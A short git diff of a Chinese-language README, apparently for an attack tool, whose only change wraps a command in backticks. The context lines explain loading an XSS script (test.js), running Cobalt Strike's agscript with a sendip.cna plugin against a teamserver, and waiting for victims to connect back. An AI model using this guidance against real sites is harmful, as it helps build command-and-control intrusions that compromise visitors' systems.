@@ -16,7 +16,7 @@ test.js可远程加载也可本地加载，修改xss内容即可
 
 使用cobalt strike 的agscript加载cna插件
 
-./agscript [ip] [port] [username] [password] sendip.cna
+`./agscript [ip] [port] [username] [password] sendip.cna`
 
 等待上线即可
 
